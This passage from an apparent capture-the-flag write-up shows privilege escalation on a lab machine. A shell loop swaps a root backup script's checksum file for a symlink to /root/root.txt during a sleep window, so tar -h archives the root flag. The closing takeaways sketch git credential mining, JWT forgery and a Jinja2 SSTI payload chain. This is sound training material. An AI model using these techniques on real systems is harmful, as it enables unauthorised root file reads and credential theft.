Phase 2

Privilege Escalation — tar Symlink Race Condition

Analyzing the Backup Script

tom@epsilon:~$ cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/mkdir /opt/backups/$file
/usr/bin/cp -rp /var/www/app/* /opt/backups/$file/
/usr/bin/sha1sum /opt/backups/$file/* > /opt/backups/$file/checksum
sleep 5
/usr/bin/tar -hcvf /var/backups/web_backups/${file}.tar /opt/backups/${file}/*
/usr/bin/rm -rf /opt/backups/$file
The race condition The script creates a checksum file, then sleep 5, then tar -h archives everything. The -h flag tells tar to follow symbolic links — meaning if we replace checksum with a symlink to /root/root.txt during the 5-second window, tar will read and archive the root flag's content with root privileges.

Exploitation

# Terminal 1: Loop waiting for the checksum file, replace with symlink
tom@epsilon:~$ while true; do
    if [ -f /opt/backups/*/checksum ]; then
        rm -rf /opt/backups/*/checksum
        ln -s /root/root.txt /opt/backups/*/checksum
        echo "symlink created!"
        break
    fi
done

# Terminal 2: As soon as "symlink created!" appears, wait a few seconds
# then grab the latest tar archive
tom@epsilon:~$ cp /var/backups/web_backups/*.tar /tmp/
$ cd /tmp && tar xf *.tar
$ cat opt/backups/*/checksum
61c2a56d654fd6444ef09a93af692dd5
Appendix

Key Takeaways

.git repositories are credential goldmines.

AWS keys and JWT secrets were both in the commit history. Use git log -p and git log -S "keyword" to search efficiently.

JWT forgery only needs the secret.

No password cracking needed — with the secret key, you can sign any payload. Check Lambda functions and config files for secrets.

Jinja2 SSTI is a Flask classic.

Test every user input reflected in the page with {{7*7}}. The request.application.__globals__ chain gives full Python access.

tar -h + sleep = race condition.

The -h flag follows symlinks, and the sleep creates a window. Replace target files with symlinks to read arbitrary files as root.
